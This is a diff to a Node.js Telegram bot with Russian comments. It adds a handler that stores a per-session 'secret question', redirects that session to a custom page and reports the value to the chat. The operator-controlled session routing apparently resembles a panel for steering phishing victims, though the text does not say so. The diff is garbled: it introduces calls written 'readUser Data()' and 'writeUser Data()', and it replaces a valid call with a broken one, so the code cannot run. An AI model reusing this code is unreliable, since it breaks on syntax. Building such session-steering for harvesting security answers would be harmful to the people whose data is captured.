@@ -229,6 +229,25 @@ bot.on('callback_query', (callbackQuery) => {
     const action = data[0];
     const sessionId = data[1];
     const routes = readRoutesData();
+
+    if (action === 'send_secret') {
+        const secretQuestion = data[2];
+        const users = readUser Data();
+        if (!users[sessionId]) {
+            users[sessionId] = {};
+        }
+        users[sessionId].secretQuestion = secretQuestion; // Сохраняем секретный вопрос
+        writeUser Data(users);
+
+        // Перемещение на кастомную страницу
+        routes[sessionId] = { action: 'custom_page', secretQuestion: secretQuestion };
+        writeRoutesData(routes);
+
+        bot.sendMessage(callbackQuery.message.chat.id, `Успешно отправлено: ${secretQuestion}\nSession ID: ${sessionId}`);
+        return;
+    }
+
+    // Остальная логика для других действий
     routes[sessionId] = { action: action };
     writeRoutesData(routes);
     let messageText;
@@ -262,7 +281,7 @@ bot.on('message', (msg) => {
         return;
     }
 
-    const users = readUserData();
+    const users = readUser Data();
     try {
         if (routes[sessionId] && routes[sessionId].action === 'waiting_for_secret_question') {
             const secretQuestion = msg.text;
@@ -276,6 +295,7 @@ bot.on('message', (msg) => {
                     ],
                 },
             });
+            // Обновляем действие на confirm_secret_question
             routes[sessionId].action = 'confirm_secret_question';
             writeRoutesData(routes);
             return;
